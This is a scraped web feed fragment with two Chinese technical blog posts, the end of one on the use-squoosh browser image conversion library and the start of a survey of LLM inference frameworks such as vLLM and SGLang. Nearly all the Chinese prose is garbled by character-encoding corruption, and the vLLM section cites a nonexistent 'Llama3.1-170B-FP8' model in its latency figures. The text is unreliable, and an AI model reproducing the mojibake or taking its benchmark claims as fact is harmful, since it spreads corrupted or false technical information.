<span class="hljs-comment">// é¡µé¢åŠ è½½æ—¶é¢„åŠ è½½å¸¸ç”¨æ ¼å¼</span>
<span class="hljs-keyword">await</span> <span class="hljs-title function_">preload</span>([<span class="hljs-string">'webp'</span>, <span class="hljs-string">'png'</span>]);

<span class="hljs-comment">// æ£€æŸ¥åŠ è½½çŠ¶æ€</span>
<span class="hljs-keyword">if</span> (<span class="hljs-title function_">isLoaded</span>(<span class="hljs-string">'webp'</span>)) {
  <span class="hljs-comment">// WebP ç¼–è§£ç å™¨å·²å°±ç»ª</span>
}
</code></pre>
<h3 data-id="heading-17">å·¥å…·å‡½æ•°</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { toBlob, toDataURL, download } <span class="hljs-keyword">from</span> <span class="hljs-string">'use-squoosh'</span>;

<span class="hljs-keyword">const</span> buffer = <span class="hljs-keyword">await</span> <span class="hljs-title function_">pngToWebp</span>(file);

<span class="hljs-comment">// è½¬ä¸º Blob</span>
<span class="hljs-keyword">const</span> blob = <span class="hljs-title function_">toBlob</span>(buffer, <span class="hljs-string">'image/webp'</span>);

<span class="hljs-comment">// è½¬ä¸º Data URLï¼ˆç”¨äº img.srcï¼‰</span>
<span class="hljs-keyword">const</span> dataUrl = <span class="hljs-keyword">await</span> <span class="hljs-title function_">toDataURL</span>(buffer, <span class="hljs-string">'image/webp'</span>);

<span class="hljs-comment">// è§¦å‘ä¸‹è½½</span>
<span class="hljs-title function_">download</span>(buffer, <span class="hljs-string">'converted.webp'</span>, <span class="hljs-string">'image/webp'</span>);
</code></pre>
<h2 data-id="heading-18">è‡ªæ‰˜ç®¡ CDN</h2>
<p>å¦‚æœä¸æƒ³ä¾èµ–å…¬å…± CDNï¼Œå¯ä»¥è‡ªæ‰˜ç®¡ç¼–è§£ç å™¨æ–‡ä»¶ã€‚</p>
<h3 data-id="heading-19">ç›®å½•ç»“æ„è¦æ±‚</h3>
<pre><code class="hljs language-kotlin" lang="kotlin">your-cdn.com/npm/
  <span class="hljs-meta">@jsquash</span>/
    <span class="hljs-symbol">webp@</span><span class="hljs-number">1.5</span><span class="hljs-number">.0</span>/
      encode.js
      decode.js
    <span class="hljs-symbol">png@</span><span class="hljs-number">3.1</span><span class="hljs-number">.1</span>/
      encode.js
      decode.js
    <span class="hljs-symbol">jpeg@</span><span class="hljs-number">1.6</span><span class="hljs-number">.0</span>/
      encode.js
      decode.js
</code></pre>
<h3 data-id="heading-20">è·å–æ–‡ä»¶</h3>
<p>ä» npm ä¸‹è½½å¯¹åº”ç‰ˆæœ¬ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä¸‹è½½ @jsquash åŒ…</span>
npm pack @jsquash/webp@1.5.0
npm pack @jsquash/png@3.1.1
npm pack @jsquash/jpeg@1.6.0

<span class="hljs-comment"># è§£å‹å¹¶éƒ¨ç½²åˆ° CDN</span>
</code></pre>
<h3 data-id="heading-21">é…ç½®ä½¿ç”¨</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-title function_">configure</span>({
  <span class="hljs-attr">baseUrl</span>: <span class="hljs-string">'https://your-cdn.com/npm'</span>,
  <span class="hljs-attr">webpVersion</span>: <span class="hljs-string">'1.5.0'</span>,
  <span class="hljs-attr">pngVersion</span>: <span class="hljs-string">'3.1.1'</span>,
  <span class="hljs-attr">jpegVersion</span>: <span class="hljs-string">'1.6.0'</span>
});
</code></pre>
<h2 data-id="heading-22">å‹ç¼©æ•ˆæœå¯¹æ¯”</h2>
<p>ä»¥ä¸€å¼  1920x1080 çš„ PNG æˆªå›¾ä¸ºä¾‹ï¼š</p>









































<table><thead><tr><th>è¾“å‡ºæ ¼å¼</th><th>Quality</th><th>æ–‡ä»¶å¤§å°</th><th>å‹ç¼©ç‡</th></tr></thead><tbody><tr><td>åŸå§‹ PNG</td><td>-</td><td>2.1 MB</td><td>-</td></tr><tr><td>WebP</td><td>80</td><td>186 KB</td><td>91%</td></tr><tr><td>WebP</td><td>90</td><td>312 KB</td><td>85%</td></tr><tr><td>JPEG</td><td>80</td><td>245 KB</td><td>88%</td></tr><tr><td>JPEG</td><td>90</td><td>398 KB</td><td>81%</td></tr></tbody></table>
<p>WebP åœ¨åŒç­‰è§†è§‰è´¨é‡ä¸‹ï¼Œæ–‡ä»¶å¤§å°æ¯” JPEG å°çº¦ 25-35%ã€‚</p>
<h2 data-id="heading-23">æµè§ˆå™¨å…¼å®¹æ€§</h2>
<p>éœ€è¦æ”¯æŒ WebAssembly å’ŒåŠ¨æ€ importï¼š</p>

























<table><thead><tr><th>æµè§ˆå™¨</th><th>æœ€ä½ç‰ˆæœ¬</th></tr></thead><tbody><tr><td>Chrome</td><td>57+</td></tr><tr><td>Firefox</td><td>52+</td></tr><tr><td>Safari</td><td>11+</td></tr><tr><td>Edge</td><td>16+</td></tr></tbody></table>
<p>è¦†ç›–å…¨çƒ 95%+ çš„ç”¨æˆ·ã€‚</p>
<h2 data-id="heading-24">ä¸å…¶ä»–æ–¹æ¡ˆå¯¹æ¯”</h2>

































































<table><thead><tr><th>ç‰¹æ€§</th><th>use-squoosh</th><th>browser-image-compression</th><th>ç›´æ¥ä½¿ç”¨ @jsquash</th></tr></thead><tbody><tr><td>åŒ…å¤§å°</td><td>&lt; 5KB</td><td>~50KB</td><td>~2KB Ã— 6</td></tr><tr><td>è¿è¡Œæ—¶ä¾èµ–</td><td>CDN åŠ è½½</td><td>æ‰“åŒ…åœ¨å†…</td><td>éœ€æ‰‹åŠ¨é…ç½®</td></tr><tr><td>WebP æ”¯æŒ</td><td>âœ…</td><td>âœ…</td><td>âœ…</td></tr><tr><td>PNG ä¼˜åŒ–</td><td>âœ…</td><td>âŒ</td><td>âœ…</td></tr><tr><td>è´¨é‡æ§åˆ¶</td><td>âœ…</td><td>âœ…</td><td>âœ…</td></tr><tr><td>è‡ªåŠ¨æ ¼å¼æ£€æµ‹</td><td>âœ…</td><td>âœ…</td><td>âŒ</td></tr><tr><td>é¢„åŠ è½½</td><td>âœ…</td><td>âŒ</td><td>éœ€æ‰‹åŠ¨</td></tr><tr><td>è‡ªå®šä¹‰ CDN</td><td>âœ…</td><td>âŒ</td><td>âŒ</td></tr><tr><td>TypeScript</td><td>âœ…</td><td>âœ…</td><td>âœ…</td></tr></tbody></table>
<h2 data-id="heading-25">æ€»ç»“</h2>
<p>use-squoosh é€šè¿‡ä»¥ä¸‹è®¾è®¡å®ç°äº†æ˜“ç”¨çš„æµè§ˆå™¨ç«¯å›¾ç‰‡è½¬æ¢ï¼š</p>
<ol>
<li><strong>é›¶ä¾èµ–è®¾è®¡</strong>ï¼šç¼–è§£ç å™¨æŒ‰éœ€ä» CDN åŠ è½½ï¼Œåº“æœ¬èº«æè½»é‡</li>
<li><strong>Promise ç¼“å­˜</strong>ï¼šé¿å…å¹¶å‘åœºæ™¯é‡å¤åŠ è½½</li>
<li><strong>å…¨å±€å…±äº«</strong>ï¼šå¤šç»„ä»¶/é¡¹ç›®å¤ç”¨ç¼–è§£ç å™¨</li>
<li><strong>çµæ´»é…ç½®</strong>ï¼šæ”¯æŒè‡ªå®šä¹‰ CDN å’Œç‰ˆæœ¬é”å®š</li>
<li><strong>TypeScript</strong>ï¼šå®Œæ•´ç±»å‹å®šä¹‰ï¼Œå¼€å‘ä½“éªŒå¥½</li>
</ol>
<p>é¡¹ç›®å·²å¼€æºï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fwsafight%2Fuse-squoosh" target="_blank" title="https://github.com/wsafight/use-squoosh" ref="nofollow noopener noreferrer">github.com/wsafight/usâ€¦</a></p>
<p>æ¬¢è¿æå‡º issue å’Œ PRã€‚</p>
<h2 data-id="heading-26">å‚è€ƒèµ„æ–™</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fsquoosh.app%2F" target="_blank" title="https://squoosh.app/" ref="nofollow noopener noreferrer">Squoosh</a> - Google çš„åœ¨çº¿å›¾ç‰‡å‹ç¼©å·¥å…·</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fjamsinclair%2FjSquash" target="_blank" title="https://github.com/jamsinclair/jSquash" ref="nofollow noopener noreferrer">jSquash</a> - Squoosh ç¼–è§£ç å™¨çš„ npm å°è£…</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwebassembly.org%2F" target="_blank" title="https://webassembly.org/" ref="nofollow noopener noreferrer">WebAssembly</a> - æµè§ˆå™¨ç«¯é«˜æ€§èƒ½è¿è¡Œæ—¶</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€æ–‡è®²æ¸…ï¼šä¸»æµå¤§æ¨¡å‹æ¨ç†éƒ¨ç½²æ¡†æ¶ï¼švLLMã€SGLangã€TensorRT-LLMã€ollamaã€XInference]]></title>    <link>https://juejin.cn/post/7592451049233776686</link>    <guid>https://juejin.cn/post/7592451049233776686</guid>    <pubDate>2026-01-07T16:49:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592451049233776686" data-draft-id="7592507671082123274" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€æ–‡è®²æ¸…ï¼šä¸»æµå¤§æ¨¡å‹æ¨ç†éƒ¨ç½²æ¡†æ¶ï¼švLLMã€SGLangã€TensorRT-LLMã€ollamaã€XInference"/> <meta itemprop="keywords" content="LLM"/> <meta itemprop="datePublished" content="2026-01-07T16:49:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ™ºæ³ŠAI"/> <meta itemprop="url" content="https://juejin.cn/user/3572727470361578"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€æ–‡è®²æ¸…ï¼šä¸»æµå¤§æ¨¡å‹æ¨ç†éƒ¨ç½²æ¡†æ¶ï¼švLLMã€SGLangã€TensorRT-LLMã€ollamaã€XInference
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3572727470361578/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ™ºæ³ŠAI
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T16:49:31.000Z" title="Wed Jan 07 2026 16:49:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ¬æ–‡ç³»ç»Ÿæ€§æ¢³ç†å½“å‰ä¸»æµçš„å¤§æ¨¡å‹æ¨ç†éƒ¨ç½²æ¡†æ¶ï¼ŒåŒ…æ‹¬vLLMã€SGLangã€TensorRT-LLMã€Ollamaã€XInferenceç­‰ã€‚</p>
<p>éšç€å¤§è¯­è¨€æ¨¡å‹æŠ€æœ¯çš„è¿…çŒ›æ¼”è¿›ï¼Œæ¨ç†éƒ¨ç½²æ¡†æ¶ä½œä¸ºè´¯é€šæ¨¡å‹èƒ½åŠ›ä¸è½åœ°åº”ç”¨çš„æ ¸å¿ƒæ¢çº½ï¼Œå…¶æˆ˜ç•¥ä»·å€¼æ­£æŒç»­æ”€å‡ã€‚æœ¬æ–‡æ—¨åœ¨å¯¹å½“å‰ä¸šç•Œå¹¿æ³›é‡‡ç”¨çš„ vLLMã€SGLangã€TensorRT-LLMã€Ollama ä¸ XInference ç­‰ä¸»æµæ¨ç†æ¡†æ¶å±•å¼€ç³»ç»Ÿæ€§å½’çº³ï¼Œå›´ç»•æ ¸å¿ƒæŠ€æœ¯è·¯å¾„ã€ç³»ç»Ÿæ¶æ„è®¾è®¡ã€å…³é”®æ€§èƒ½æŒ‡æ ‡åŠå…¸å‹é€‚ç”¨åœºæ™¯ç­‰å¤šç»´åº¦è¿›è¡Œæ·±åº¦å‰–æï¼Œä¸ºå¤§æ¨¡å‹åœ¨ç”Ÿäº§ç¯å¢ƒä¸­çš„é€‰å‹å†³ç­–æä¾›åšå®ä¾æ®ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€vLLMï¼šåŸºäºPyTorchçš„é«˜æ€§èƒ½æ¨ç†å¼•æ“</h2>
<p>vLLMï¼ˆVectorized Large Language Model Serving Systemï¼‰æ˜¯åŠ å·å¤§å­¦ä¼¯å…‹åˆ©åˆ†æ ¡å›¢é˜Ÿæ¨å‡ºçš„å¼€æºæ¨ç†ç³»ç»Ÿï¼Œæ—¨åœ¨çªç ´å¤§æ¨¡å‹éƒ¨ç½²ä¸­æ˜¾å­˜åˆ©ç”¨ç‡ä½ä¸æ¨ç†ååé‡å—é™çš„åŒé‡æŒ‘æˆ˜ã€‚</p>
<p>å…¶æŠ€æœ¯çªç ´ä¾æ‰˜äºä¸¤é¡¹æ ¸å¿ƒæœºåˆ¶ï¼šâ€ŒPagedAttentionâ€Œï¼ˆåˆ†é¡µæ³¨æ„åŠ›ï¼‰ä¸â€ŒContinuous Batchingâ€Œï¼ˆè¿ç»­æ‰¹å¤„ç†ï¼‰ï¼ŒäºŒè€…å‡å—æ“ä½œç³»ç»Ÿå†…å­˜åˆ†é¡µæœºåˆ¶å¯å‘ï¼Œé‡æ„äº†æ³¨æ„åŠ›è®¡ç®—ä¸è¯·æ±‚è°ƒåº¦çš„åº•å±‚é€»è¾‘ï¼Œä»è€Œåœ¨ä¸ç‰ºç‰²ç²¾åº¦çš„å‰æä¸‹ï¼Œå¤§å¹…ä¼˜åŒ–äº†æ˜¾å­˜ç®¡ç†æ•ˆç‡ä¸å¹¶å‘æ¨ç†èƒ½åŠ›ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/20bd5b8e3af742cd8c7ccaf2f3c6191b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768409371&amp;x-signature=woLOEdn3PAwLSSVPn8446ItOfNo%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fyuan.zhipoai.cn%2F" target="_blank" title="https://yuan.zhipoai.cn/" ref="nofollow noopener noreferrer"><strong>æ›´å¤šAIå¤§æ¨¡å‹å­¦ä¹ è§†é¢‘åŠèµ„æºï¼Œéƒ½åœ¨æ™ºæ³ŠAIã€‚</strong></a></p>
<h3 data-id="heading-1">1ã€æ ¸å¿ƒæŠ€æœ¯ç‰¹ç‚¹</h3>
<p>vLLM çš„åº•å±‚æ¶æ„æ„å»ºäº PyTorch ä¹‹ä¸Šï¼Œç»ç”±æ·±åº¦ç³»ç»Ÿçº§ä¼˜åŒ–ï¼Œè¾¾æˆå“è¶Šçš„æ¨ç†æ€§èƒ½ã€‚å…¶æ ‡å¿—æ€§æŠ€æœ¯çªç ´ä¸ºï¼š</p>
<p>PagedAttentionï¼šå—æ“ä½œç³»ç»Ÿåˆ†é¡µç®¡ç†æœºåˆ¶å¯å‘ï¼Œå°†æ³¨æ„åŠ›æœºåˆ¶ä¸­çš„é”®å€¼ç¼“å­˜ï¼ˆKV Cacheï¼‰ä»¥éè¿ç»­æ–¹å¼éƒ¨ç½²äºæ˜¾å­˜ä¸­ã€‚ç›¸è¾ƒä¼ ç»Ÿæ¡†æ¶ä¸ºæ¯ä¸ªè¯·æ±‚å¼ºåˆ¶åˆ†é…è¿ç»­æ˜¾å­˜å—çš„æ¨¡å¼ï¼ŒvLLM å°† KV Cache æ‹†åˆ†ä¸ºå›ºå®šå°ºå¯¸çš„â€œé¡µâ€ï¼Œå®ç°æ˜¾å­˜ç©ºé—´çš„åŠ¨æ€è°ƒåº¦ä¸é«˜æ•ˆå¤ç”¨ï¼Œä»è€Œå½»åº•ç¼“è§£äº†æ˜¾å­˜ç¢ç‰‡åŒ–ã€é¢„ç•™å†—ä½™ä¸å¹¶å‘å®¹é‡å—é™ä¸‰å¤§æ ¸å¿ƒç—›ç‚¹ã€‚è¯¥æ¶æ„ä½¿æ˜¾å­˜åˆ©ç”¨ç‡ç”±ä¼ ç»Ÿæ–¹æ¡ˆçš„ 60% æ˜¾è‘—è·ƒå‡è‡³ 95% ä»¥ä¸Šï¼Œæ˜¾è‘—å¢å¼ºç³»ç»Ÿå¯¹é«˜å¹¶å‘è¯·æ±‚çš„æ‰¿è½½èƒ½åŠ›ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/651dd0050a7b4efd836761904c526f60~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768409371&amp;x-signature=7ym6l%2FJ%2Bmrq%2FGbHv9fzFkhS2VxY%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>PagedAttentionï¼šKV ç¼“å­˜è¢«åˆ’åˆ†ä¸ºå—ï¼›å—åœ¨å†…å­˜ç©ºé—´ä¸­ä¸éœ€è¦è¿ç»­ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/156af1818ad14d1089b02c24dc26c61c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768409371&amp;x-signature=PVbhohNBapolCWSpoFGuivZSuDY%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ä½¿ç”¨ PagedAttention çš„è¯·æ±‚ç¤ºä¾‹ç”Ÿæˆè¿‡ç¨‹</p>
<p>Continuous Batchingâ€Œï¼šçªç ´ä¼ ç»Ÿæ‰¹é‡ç­‰å¾…æœºåˆ¶ï¼Œæ”¯æŒæ–°è¯·æ±‚å®æ—¶æ’å…¥å¤„ç†é˜Ÿåˆ—ï¼Œå®ç°GPUèµ„æºçš„é›¶ç©ºé—²è¿è¡Œã€‚è¯¥æœºåˆ¶æ˜¾è‘—é™ä½é«˜å¹¶å‘åœºæ™¯ä¸‹çš„TTFTï¼ˆé¦–å­—å‡ºè¯æ—¶é—´ï¼‰ï¼Œåœ¨Llama3.1-170B-FP8å•H100ç¯å¢ƒä¸‹ï¼ŒTTFTä½è‡³123msï¼Œä¼˜äºTensorRT-LLMï¼ˆ194msï¼‰ä¸SGLangï¼ˆ340msï¼‰ã€‚</p>
<p>å¤šå¡å¹¶è¡Œä¼˜åŒ–â€Œï¼šå…¨é¢å…¼å®¹å¼ é‡å¹¶è¡Œï¼ˆTensor Parallelismï¼‰ä¸æµæ°´çº¿å¹¶è¡Œï¼ˆPipeline Parallelismï¼‰ï¼Œä¾æ‰˜NCCL/MPIç­‰é«˜æ€§èƒ½é€šä¿¡æ¡†æ¶ï¼Œå®ç°æ¨¡å‹å‚æ•°çš„ç²¾ç»†åŒ–åˆ‡åˆ†ä¸é«˜æ•ˆåŒæ­¥ï¼Œåœ¨é™ä½æ˜¾å­˜å ç”¨çš„åŒæ—¶ï¼Œæ˜¾è‘—å¢å¼ºæ•´ä½“ååèƒ½åŠ›ã€‚</p>
<p>é‡åŒ–ä¼˜åŒ–æ”¯æŒâ€Œï¼šåŸç”Ÿé›†æˆGPTQã€AWQç­‰å…ˆè¿›é‡åŒ–ç®—æ³•ï¼Œç²¾å‡†å‹ç¼©æ¨¡å‹å‚æ•°è§„æ¨¡ï¼Œå¤§å¹…æå‡GPUè®¡ç®—å¯†åº¦ä¸æ¨ç†æ•ˆç‡ï¼Œå®ç°æ€§èƒ½ä¸èµ„æºæ¶ˆè€—çš„æœ€ä¼˜å¹³è¡¡ã€‚</p>
<h3 data-id="heading-2">2ã€é€‚ç”¨åœºæ™¯ä¸ä¼˜åŠ¿å±€é™åˆ†æ</h3>
<p>é€‚ç”¨åœºæ™¯â€Œï¼švLLM ä¸“ä¸ºé«˜å¹¶å‘ä¼ä¸šçº§åº”ç”¨è®¾è®¡ï¼Œå¦‚åœ¨çº¿å®¢æœã€é‡‘èäº¤æ˜“ä¸æ™ºèƒ½æ–‡æ¡£å¤„ç†ç­‰å¯¹å»¶è¿Ÿä¸ååé‡æœ‰ä¸¥è‹›è¦æ±‚çš„åœºæ™¯ï¼›æ— è®ºåœ¨å•å¡è¿˜æ˜¯å¤šå¡éƒ¨ç½²ç¯å¢ƒä¸‹ï¼Œå‡èƒ½ç»´æŒæä½çš„ TTFTï¼Œå®Œç¾å¥‘åˆå¯¹å“åº”é€Ÿåº¦æœ‰æè‡´éœ€æ±‚çš„å®æ—¶ç³»ç»Ÿã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2ef8215bd6604fe8b100e64752ad677c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768409371&amp;x-signature=eKvCQ7bEXcSy%2BGImBF2MZy68ZhY%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h2 data-id="heading-3">äºŒã€SGLangï¼šåŸºäºRadixæ ‘çš„é«˜ååæ¨ç†å¼•æ“</h2>
<p>SGLang æ˜¯ä¼¯å…‹åˆ©å›¢é˜Ÿæ‰“é€ çš„å¦ä¸€æ¬¾å¤§æ¨¡å‹æ¨ç†å¼•æ“ï¼Œè‡´åŠ›äºä¼˜åŒ– LLM çš„ååæ€§èƒ½ä¸å“åº”æ—¶å»¶ï¼ŒåŒæ—¶é™ä½ç¼–ç¨‹å¤æ‚åº¦ã€‚</p>
<p>å…¶æ ¸å¿ƒæœºåˆ¶ä¸º RadixAttentionï¼Œå€ŸåŠ©ç²¾ç»†åŒ–çš„ç¼“å­˜ç­–ç•¥ä¸ç»“æ„åŒ–è¾“å‡ºå¢å¼ºï¼Œæœ‰æ•ˆæ”¯æ’‘é«˜å¹¶å‘æœåŠ¡éœ€æ±‚ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3dcde3c4bbec498392f0e6f431e5def9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768409371&amp;x-signature=tVaBSEcdUhdWVNKad4vdjURhSdM%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h3 data-id="heading-4">1ã€æ ¸å¿ƒæŠ€æœ¯ç‰¹ç‚¹</h3>
<p>SGLangçš„æ ¸å¿ƒçªç ´åœ¨äºé›†æˆäº†RadixAttentionæŠ€æœ¯ä¸ç»“æ„åŒ–è¾“å‡ºæœºåˆ¶ï¼š</p>
